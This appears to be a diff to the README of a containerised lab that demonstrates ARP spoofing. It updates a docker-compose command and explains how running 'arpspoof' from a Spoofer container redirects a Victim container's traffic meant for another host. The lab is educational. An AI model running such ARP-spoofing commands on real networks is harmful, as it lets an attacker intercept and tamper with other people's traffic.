@@ -69,13 +69,14 @@ ping 172.20.0.2
 ```
 - Run Spoofer (172.20.0.4) Container:
 ```
-sudo docker compose run --build --rm spoofer zsh
+sudo docker-compose run --rm spoofer zsh
 ```
 - In Spoofer container:
 ```
 arpspoof -i eth0 -t 172.20.0.3 172.20.0.2
 ```
-- This changes the Arp Cache in Victim (172.20.0.3) so that Idle (172.20.0.2) is associated with the Spoofer's MAC address.
+- This changes the Arp Cache in Victim (172.20.0.3) so that Idle (172.20.0.2) is associated with the Spoofer's (172.20.0.4) MAC address.
+- Doing so, traffic that Victim (172.20.0.3) sends to Idle (172.20.0.2) is redirected to the Spoofer (172.20.0.4).
 
 # Clean Containers
 ```
